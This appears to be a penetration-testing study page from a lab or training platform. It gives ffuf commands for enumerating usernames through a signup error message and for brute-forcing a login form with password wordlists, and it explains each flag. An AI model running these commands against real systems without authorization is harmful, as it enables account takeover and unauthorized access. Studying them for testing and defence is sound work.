# Authentication Bypass

## Username Enumeration

#### Objective

Enumerate valid usernames by analyzing the server's **error message** when attempting to register with an already existing username

<figure><img src="../../../.gitbook/assets/1 (7).png" alt="" width="316"><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/2 (8).png" alt=""><figcaption></figcaption></figure>

#### 🛠️ Command

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST \
-d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.10.41/customers/signup \
-mr "An account with this username already exists"

```

#### Parameter Breakdown

| Flag      | Description                                                                                                        |
| --------- | ------------------------------------------------------------------------------------------------------------------ |
| `-w`      | Path to the username wordlist.                                                                                     |
| `-X POST` | Sends a POST request.                                                                                              |
| `-d`      | Form data; `FUZZ` is replaced by each username from the list.                                                      |
| `-H`      | Sets the content type to form-urlencoded.                                                                          |
| `-u`      | Target URL of the signup form.                                                                                     |
| `-mr`     | Match response for the string <kbd>An account with this username already exists</kbd> to identify valid usernames. |



***

## Brute Force

<figure><img src="../../../.gitbook/assets/3 (8).png" alt=""><figcaption></figcaption></figure>

#### Objective

Test combinations of valid usernames and common passwords against a login form to identify valid credentials

#### 🛠️ Command

```bash
ffuf -w username.txt:USER \
-w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.235.89/customers/login \
-fs 732

```

#### 🔍 Parameter Breakdown

| Flag          | Description                                                                          |
| ------------- | ------------------------------------------------------------------------------------ |
| `-w file:KEY` | Assigns wordlist to variable (e.g. `USER` for usernames, `PASS` for passwords).      |
| `-X POST`     | Uses POST method to send data.                                                       |
| `-d`          | POST data; `USER` and `PASS` are replaced from wordlists.                            |
| `-H`          | Adds HTTP header to specify form content type.                                       |
| `-u`          | Target login endpoint.                                                               |
| `-fs 732`     | Filters out failed login responses by response **Size** (732 = size of failed login) |

***

